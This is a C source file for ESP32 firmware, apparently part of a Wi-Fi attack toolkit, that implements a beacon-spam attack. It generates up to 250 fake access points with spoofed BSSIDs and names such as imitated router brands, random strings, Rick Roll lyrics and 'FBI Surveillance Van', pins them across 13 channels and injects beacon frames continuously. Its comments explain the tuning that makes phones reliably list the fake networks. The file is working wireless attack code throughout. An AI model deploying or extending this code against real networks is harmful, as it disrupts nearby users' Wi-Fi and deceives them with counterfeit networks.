/**
 * @file attack_beacon_spam.c
 * @author SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * @copyright Copyright (c) 2026
 */

#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_log.h"
#include <string.h>

static const char *TAG = "beacon_spam";
static esp_timer_handle_t beacon_timer_handle;

/* The wire protocol's count field (attack_request_t.method, reused for this
 * attack type) is a single byte — 255 is a hard ceiling no matter what.
 * Capped a bit under that instead of pushing to the exact edge. */
#define MAX_SPAM_APS 250
typedef struct {
    uint8_t ssid[33];
    uint8_t ssid_len;
    uint8_t bssid[6];
    uint8_t channel;   /* fixed for this AP's lifetime — see BEACON_HOP_CHANNELS below */
} spam_ap_t;

static spam_ap_t spam_pool[MAX_SPAM_APS];
static uint16_t active_spam_count = 20;

/* Without channel assignment, every fake AP only ever broadcasts on
 * whatever single channel the radio happened to be on — a phone scanning a
 * different channel never sees any of them no matter how many are
 * configured. So each fake AP is pinned to one of the 13 2.4GHz channels at
 * creation time (round-robin by pool index) — exactly like a real AP, which
 * never changes channel mid-operation. This matters beyond just coverage:
 * an earlier version re-tagged the SAME BSSID with whatever channel the
 * radio currently happened to be hopped to, so a phone's Wi-Fi stack would
 * see one BSSID "moving" between channels every ~13s — several stacks treat
 * that as an unstable/roaming artifact and flicker the entry in and out of
 * the visible list, which is exactly the "beacons somem e voltam" symptom.
 * Pinning the channel keeps every fake AP's identity stable across scans.
 * Since there's only one radio, dwelling on each channel in turn still
 * moves the management AP's channel along with it — same trade-off
 * Deauth/Evil Twin/Multi-Clone already make, so
 * attack_beacon_spam_start()/_stop() bring the management AP down/back up
 * too (see attack.c). */
#define BEACON_HOP_CHANNELS       13
#define BEACON_HOP_EVERY_N_TICKS  10   /* ~1s of dwell per channel at the 100ms tick rate */
static uint8_t  beacon_channel     = 1;
static uint16_t beacon_hop_counter = 0;

/* Frames actually injected per timer tick. Calibrated against the deauth
 * path's own proven ceiling (up to 50 small ~26-byte frames per 100ms tick,
 * see DEAUTH_INTENSITY_MAX in attack_method.c) — beacon frames here run up
 * to 128 bytes, several times larger, so a lower per-tick count keeps each
 * burst comfortably inside one tick's real airtime instead of spilling into
 * the next and backing up the driver's TX queue. Kept deliberately
 * conservative (not just "as high as seemed to work") because this needs to
 * hold up over minutes of continuous running, not just look good in a
 * quick test — see the self-check in timer_send_beacon() below.
 *
 * Also doubles as the per-channel capacity: with MAX_SPAM_APS split evenly
 * across BEACON_HOP_CHANNELS, no single channel's subset can exceed this —
 * see the _Static_assert below. Keep it that way if either constant
 * changes, or the loop in timer_send_beacon() will silently start
 * truncating a channel's subset again, the exact bug this whole rework
 * fixed. */
#define BEACON_BATCH_SIZE 20
_Static_assert(BEACON_BATCH_SIZE >= (MAX_SPAM_APS + BEACON_HOP_CHANNELS - 1) / BEACON_HOP_CHANNELS,
               "BEACON_BATCH_SIZE must cover the largest per-channel AP subset");


static const char *base_names[] = { "TP-Link", "Linksys", "Netgear", "ASUS", "D-Link", "Home", "Office", "Starlink", "EastWest" };
static const char *suffixes[] = { "_WiFi", "-Guest", "-5G", "_Secure", "" };
static const char *emojis[] = { "🔥","📶","🚀","✨","⚡" };


static const char *rick_lyrics[] = {
    "Never Gonna Give You Up", "Never Gonna Let You Down",
    "Never Gonna Run Around", "And Desert You",
    "Never Gonna Make You Cry", "Never Gonna Say Goodbye",
    "Never Gonna Tell A Lie", "And Hurt You"
};


static const char *troll_names[] = {
    "FBI Surveillance Van 04", "Virus.exe", "Get Off My LAN",
    "Free Public WiFi", "Loading...", "Searching...", "Click for virus"
};

static void generate_ssid_by_mode(uint8_t *ssid, uint8_t *length, beacon_spam_mode_t mode, int index) {
    char final[33] = {0};

    switch(mode) {
        case BEACON_MODE_COMMON: {
            int b = esp_random() % (sizeof(base_names)/sizeof(base_names[0]));
            int s = esp_random() % (sizeof(suffixes)/sizeof(suffixes[0]));
            snprintf(final, sizeof(final), "%s%s", base_names[b], suffixes[s]);
            if ((esp_random() % 100) < 10) {
                strncat(final, emojis[esp_random()%5], sizeof(final)-strlen(final)-1);
            }
            break;
        }
        case BEACON_MODE_GARBAGE: {
            const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;";
            int len = 8 + (esp_random() % 12);
            for (int i = 0; i < len; i++) final[i] = charset[esp_random() % (sizeof(charset)-1)];
            break;
        }
        case BEACON_MODE_RICK_ROLL: {
            strncpy(final, rick_lyrics[index % (sizeof(rick_lyrics)/sizeof(rick_lyrics[0]))], 32);
            break;
        }
        case BEACON_MODE_SECURITY: {
            strncpy(final, troll_names[index % (sizeof(troll_names)/sizeof(troll_names[0]))], 32);
            break;
        }
    }

    size_t len = strlen(final);
    if (len > 32) len = 32;
    memcpy(ssid, final, len);
    *length = len;
}

/* Sends every fake AP assigned to the CURRENT dwell channel, every single
 * tick, for the whole ~1s that channel is active — not a slice of the full
 * pool. A phone's own scan only lingers on each channel for a short window
 * (tens of milliseconds), so re-broadcasting that channel's whole subset
 * ten times over its dwell (once per 100ms tick) gives it many chances to
 * land inside that narrow window, instead of the fake AP only getting one
 * shot somewhere in the whole dwell period. This is safe precisely because
 * each channel's subset is capped at BEACON_BATCH_SIZE (see the
 * _Static_assert above) — same calibrated per-tick ceiling already proven
 * to fit inside one 100ms tick's real airtime without backing up the TX
 * queue, so full pool sizes up to MAX_SPAM_APS never risk the old
 * "early-indexed APs starve the rest" problem. */
/* Timing budget for one tick, in microseconds. Kept as a named constant so
 * the self-check below and esp_timer_start_periodic() can't drift apart. */
#define BEACON_TICK_US 100000

static void timer_send_beacon(void *arg) {
    /* Only touch the radio's channel right at the start of a new dwell
     * period, not every tick — a channel switch has its own settling cost,
     * and calling it once per second instead of ten times a second is both
     * cheaper and enough for a scanning device to actually catch us there. */
    if (beacon_hop_counter == 0) {
        esp_wifi_set_channel(beacon_channel, WIFI_SECOND_CHAN_NONE);
    }
    beacon_hop_counter++;
    if (beacon_hop_counter >= BEACON_HOP_EVERY_N_TICKS) {
        beacon_hop_counter = 0;
        beacon_channel = (beacon_channel % BEACON_HOP_CHANNELS) + 1;
    }

    int64_t t0 = esp_timer_get_time();
    for (uint16_t i = 0; i < active_spam_count; i++) {
        if (spam_pool[i].channel != beacon_channel) continue;
        wsl_bypasser_send_beacon_frame(spam_pool[i].bssid, spam_pool[i].ssid, spam_pool[i].ssid_len, beacon_channel);
    }

    /* Self-diagnostic instead of a guessed-and-hoped-for batch size: if a
     * batch is actually eating most of its tick's time budget, that's the
     * real, hardware-measured signal (not a rough estimate) that
     * BEACON_BATCH_SIZE is too high for reliable long-run operation and
     * should be turned down. Rate-limited so it can't itself become a
     * source of overhead during a long run. */
    int64_t elapsed_us = esp_timer_get_time() - t0;
    if (elapsed_us > (BEACON_TICK_US * 8) / 10) {
        static int64_t last_warn_at = 0;
        if (t0 - last_warn_at > 5000000) {
            ESP_LOGW(TAG, "Beacon batch took %lldms of a %dms tick — lower the fake-network count if scans look inconsistent",
                     (long long) (elapsed_us / 1000), BEACON_TICK_US / 1000);
            last_warn_at = t0;
        }
    }
}

void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
    active_spam_count = (count > 0 && count <= MAX_SPAM_APS) ? count : 20;
    beacon_channel = 1;
    beacon_hop_counter = 0;

    for (int i = 0; i < active_spam_count; i++) {
        generate_ssid_by_mode(spam_pool[i].ssid, &spam_pool[i].ssid_len, mode, i);
        for (int j = 0; j < 6; j++) spam_pool[i].bssid[j] = esp_random() & 0xFF;
        spam_pool[i].bssid[0] = (spam_pool[i].bssid[0] & 0xFE) | 0x02;
        spam_pool[i].channel = (i % BEACON_HOP_CHANNELS) + 1;
    }

    const esp_timer_create_args_t args = { .callback = &timer_send_beacon };
    esp_timer_create(&args, &beacon_timer_handle);
    /* 100ms tick — same interval already proven stable for the deauth path's
     * own periodic timer. Kept generous on purpose: this needs to survive
     * minutes of continuous running, and there's headroom to safely lower
     * later (watch for the self-check warning above) rather than tune
     * purely from an untested guess. */
    esp_timer_start_periodic(beacon_timer_handle, BEACON_TICK_US);
    uint32_t spectrum_sweep_ms = BEACON_HOP_CHANNELS * BEACON_HOP_EVERY_N_TICKS * (BEACON_TICK_US / 1000);
    ESP_LOGI(TAG, "Beacon spam started. Mode: %d, %u APs pinned across %d channels (~%u/channel), full sweep ~%lums",
             mode, active_spam_count, BEACON_HOP_CHANNELS,
             (active_spam_count + BEACON_HOP_CHANNELS - 1) / BEACON_HOP_CHANNELS,
             (unsigned long) spectrum_sweep_ms);
}

void attack_beacon_spam_stop() {
    if (beacon_timer_handle) {
        esp_timer_stop(beacon_timer_handle);
        esp_timer_delete(beacon_timer_handle);
        beacon_timer_handle = NULL;
    }
    ESP_LOGI(TAG, "Beacon spam stopped.");
}
